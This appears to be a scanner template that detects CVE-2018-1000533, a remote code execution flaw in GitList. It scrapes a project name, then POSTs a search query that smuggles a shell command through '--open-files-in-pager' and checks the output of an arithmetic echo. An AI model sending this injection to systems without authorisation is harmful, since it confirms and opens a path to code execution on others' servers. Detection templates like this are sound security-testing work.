id: CVE-2018-1000533

info:
  name: GitList < 0.6.0 RCE
  author: Print1n
  severity: critical
  verified: false
  description: |-
    klaussilveira GitList version <= 0.6 contains a Passing incorrectly sanitized input to system function vulnerability in `searchTree` function that can result in Execute any code as PHP user. This attack appear to be exploitable via Send POST request using search form. This vulnerability appears to have been fixed in 0.7 after commit 87b8c26b023c3fc37f0796b14bb13710f397b322.
  reference:
    - https://www.exploit-db.com/exploits/46235
    - https://nvd.nist.gov/vuln/detail/CVE-2018-1000533
  tags: cve,cve2018,gitlist,rce
  created: 2023/08/10

set:
  r1: randomInt(800000000, 1000000000)
  r2: randomInt(800000000, 1000000000)
  r3: randomLowercase(8)
rules:
  r0:
    request:
      method: GET
      path: /
    expression: response.status == 200 && "gitlist".bmatches(response.body)
    output:
      search: '"<span class=\"name\">(?P<project_name>.+?)</span>".bsubmatch(response.body)'
      project_name: search["project_name"]
  r1:
    request:
      method: POST
      path: /{{project_name}}/tree/a/search
      body: |
        query=--open-files-in-pager=echo%20{{r3}}:$(expr%20{{r1}}%20%2b%20{{r2}}):{{r1}}:{{r1}}
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1 + r2)))
expression: r0() && r1()
